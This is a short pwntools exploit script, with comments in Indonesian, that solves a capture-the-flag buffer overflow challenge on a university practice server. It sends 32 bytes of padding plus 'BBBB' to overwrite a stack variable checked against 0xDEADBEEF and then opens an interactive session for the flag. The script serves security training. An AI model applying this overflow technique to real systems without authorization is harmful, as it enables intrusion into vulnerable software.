from pwn import *

# 1. Konfigurasi
exe = './chall'
elf = ELF(exe)
context.binary = exe

# Koneksi ke server remote
io = remote('practice-digitalsecuritylab.di.unipi.it', 10001)

# 2. Kalkulasi Payload
# Jarak v4 ke v5 adalah 32 byte.
# Kita hanya perlu merusak nilai v5 agar tidak sama dengan 0xDEADBEEF (-559038737).
# Jadi payload = 32 byte padding + data sampah apapun.
offset = 32

# 3. Menyusun Payload
# Mengirim 32 byte 'A', ditambah 4 byte 'B' untuk menimpa v5 sepenuhnya (sebenarnya 1 byte pun cukup).
payload = b'A' * offset + b'BBBB'

log.info(f"Payload length: {len(payload)}")

# 4. Mengirim Payload
io.recvuntil(b'Enter your name: ')
io.sendline(payload)

# 5. Mendapatkan Flag
io.interactive()
